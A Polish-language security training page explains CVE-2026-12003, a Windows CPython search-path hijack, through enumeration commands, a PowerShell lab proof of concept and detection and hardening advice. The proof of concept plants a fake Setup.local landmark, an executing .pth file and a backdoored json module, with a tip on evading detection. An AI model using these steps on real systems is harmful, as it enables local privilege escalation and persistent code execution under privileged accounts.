# Hijacking punktu orientacyjnego kompilacji Windows CPython i `sys.path`

{{#include ../../../banners/hacktricks-training.md}}

Środowisko uruchomieniowe może zachowywać ścieżki względne, które były przeznaczone wyłącznie dla drzewa kompilacji. Jeśli zainstalowane środowisko uruchomieniowe z uprawnieniami rozwiąże jedną z tych ścieżek do katalogu zapisywalnego przez użytkownika o niskich uprawnieniach, attacker może umieścić oczekiwany **build landmark** i sprawić, że środowisko uruchomieniowe zaufa alternatywnemu prefiksowi bibliotek. CVE-2026-12003 to przykład dotyczący Windows CPython: umieszczony `Modules\Setup.local` może przekierować wpis standardowej biblioteki w `sys.path` bez modyfikowania chronionej instalacji Python.<sup>[[1]](#references)[[2]](#references)</sup>

## Łańcuch konstruowania ścieżki CPython

Podatne kompilacje Windows zostały skompilowane z `VPATH=..\..` i udostępniały tę wartość jako `sys._vpath`. Podatny fallback w `Modules/getpath.py` traktował `VPATH\Modules\Setup.local` jako dowód, że interpreter jest uruchamiany z drzewa źródłowego; poniższy przepływ danych przekształca tę wartość z czasu kompilacji w runtime search-path primitive.<sup>[[1]](#references)[[2]](#references)</sup>

| Etap | Wartość pochodna dla `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Skompilowana ścieżka kompilacji | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Landmark utworzony przez attackera | `C:\Modules\Setup.local` |
| Wybrany `build_prefix` | `C:\` |
| Wybrana biblioteka standardowa | `C:\Lib` |
| Wynik | Kontrolowany przez attackera katalog `C:\Lib` zostaje dodany do `sys.path` |

Sprawdzenie to jest fallbackiem używanym, gdy bardziej szczegółowy `pybuilddir.txt` znajdujący się obok pliku wykonywalnego nie istnieje lub jest nieczytelny. Ma to znaczenie, ponieważ użytkownik o niskich uprawnieniach może nie być w stanie zmienić `C:\Program Files\Python314`, a mimo to nadal może tworzyć nowe katalogi w `C:\`. Późniejszy uprzywilejowany proces `python.exe` ładuje kod Python przy użyciu własnego access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Warunki wstępne

Traktuj to jako granicę uprawnień tylko wtedy, gdy spełnione są wszystkie poniższe warunki:<sup>[[1]](#references)[[2]](#references)</sup>

- Celem jest podatna kompilacja **Windows CPython**; podatna logika ścieżek nie jest właściwością języka Python.
- Katalog uzyskany przez rozwiązanie `..\..` względem katalogu zawierającego `python.exe` pozwala użytkownikowi o niższych uprawnieniach utworzyć landmark oraz drzewo `Lib`.
- Użytkownik o wyższych uprawnieniach, usługa, instalator lub konto używane do wdrażania oprogramowania uruchamia później ten interpreter.
- Żadna konfiguracja izolacji ścieżek nie nadpisuje podatnej ścieżki wykrywania.

## Enumeracja

Sprawdź zarówno skompilowaną wartość, jak i efektywną ścieżkę wyszukiwania. Ujawniona wartość `..\..` jest użyteczną wskazówką, ale nie stanowi dowodu możliwości wykorzystania podatności: rozwiąż również ścieżkę, sprawdź ACL oraz potwierdź, że umieszczony landmark znajdowałby się poza chronioną instalacją.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Nie ograniczaj oceny do oficjalnych instalatorów. Dla każdego produktu zawierającego `python.exe` rozwiąż jego `sys._vpath` względem rzeczywistego katalogu pliku wykonywalnego i sprawdź listy ACL lokalizacji `Modules` oraz `Lib` wynikających z tej ścieżki. Głębsza ścieżka instalacji może wskazywać inną zapisywalną aplikację lub katalog dostawcy zamiast `C:\`.<sup>[[1]](#references)</sup>

## Procedura wykorzystania w labie

Poniższy PoC laboratoryjny odtwarza wystarczającą część prawidłowego środowiska uruchomieniowego poniżej wybranego prefiksu, aby Python mógł się zainicjalizować, dodaje wykonywany wiersz `.pth`, a na końcu tworzy landmark. Utwórz payload przed landmarkiem, aby uniknąć tymczasowego wskazywania interpretera na niekompletne drzewo bibliotek.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Podczas normalnej inicjalizacji witryny Python przetwarza pliki `.pth` w rozpoznanych katalogach site-packages. Wykonywane są tylko wiersze rozpoczynające się od `import`, po którym występują białe znaki, a instrukcja wykonywalna musi pozostać w jednym wierszu fizycznym; `python -S` pomija automatyczny import `site`, a tym samym ten wyzwalacz.<sup>[[1]](#references)[[4]](#references)</sup>

### Alternatywa wyzwalana przez import

Wykonywanie podczas uruchamiania nie jest wymagane. Po odtworzeniu prawidłowego drzewa bibliotek dodaj backdoor do modułu, który uprzywilejowany skrypt przewidywalnie importuje. Na przykład dodanie kodu do umieszczonego przez atakującego `Lib\json\__init__.py` spowoduje jego wykonanie, gdy ofiara zaimportuje `json`; wybranie niezawodnego, ale nieimportowanego powszechnie modułu może ograniczyć wykrywalność wyzwalacza.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Ten wariant nadal dziedziczy token procesu importującego, ale zależy od tego, czy docelowa aplikacja zaimportuje zmodyfikowany moduł. Podczas testowania rzeczywistego oprogramowania zachowaj oryginalne działanie modułu, ponieważ w przeciwnym razie import może zakończyć się niepowodzeniem przed ukończeniem zamierzonego uprzywilejowanego workflow.<sup>[[1]](#references)</sup>

## Pre-installation planting

Planting w ścieżce wyszukiwania może poprzedzać instalację. Użytkownik o niskich uprawnieniach może przygotować przyszłe drzewo `Lib` oraz `Modules\Setup.local`, a następnie czekać, aż uprzywilejowany portal oprogramowania, workflow help-desku lub system wdrażania przeprowadzi instalację dla wszystkich użytkowników. Installers, które uruchamiają nowy interpreter w celu instalowania packages lub wstępnej kompilacji standard library, mogą uruchomić payload w ramach konta wdrażającego, bez konieczności ręcznego otwierania Python przez administratora.<sup>[[1]](#references)</sup>

Zmienia to również sposób przeglądu wdrożeń: sprawdzaj zapisywalne katalogi nadrzędne oraz wcześniej istniejące katalogi landmark/library **przed** zainstalowaniem lub uaktualnieniem bundled runtime, zamiast sprawdzać wyłącznie końcowy katalog instalacji po wdrożeniu.<sup>[[1]](#references)</sup>

## Detection and hardening

Przydatne pivots na hoście to nieoczekiwany landmark i drzewo library, a następnie uprzywilejowane uruchomienie Python. Wyszukuj `Modules\Setup.local`, katalogi `Lib\site-packages\*.pth` na poziomie root lub w innych nietypowych lokalizacjach, skopiowane packages standard library oraz pliki modułów, których właściciel lub czas utworzenia różni się od chronionej instalacji. Koreluj ich utworzenie przez standardowego użytkownika z podwyższonymi uprawnieniami `python.exe`, uruchamiającym `cmd.exe`, `powershell.exe`, narzędzia do zarządzania kontami lub inne nietypowe procesy potomne.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Poprawka upstream usuwa mechanizm fallbacku `VPATH\Modules\Setup.local` i sprawia, że `pybuilddir.txt` jest jedynym wskaźnikiem drzewa kompilacji. Preferuj stałą kompilację lub instalację per-user zarządzaną za pomocą aktualnego Python install manager. Gdy aktualizacja jest tymczasowo niemożliwa, zabezpiecz rozpoznanego przodka i wstępnie utwórz `Modules` z restrykcyjnymi ACL; kontrolowane pliki `._pth` lub `PYTHONHOME` mogą również zmienić mechanizm wyszukiwania, ale wymagają testów zgodności aplikacji.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Przejęcie ścieżki wyszukiwania Windows CPython i eskalacja lokalnych uprawnień](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - Ścieżki wyszukiwania w drzewie źródłowym mogą być włączane bez modyfikowania katalogu instalacyjnego](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Usuń fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - Pliki konfiguracyjne ścieżki `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
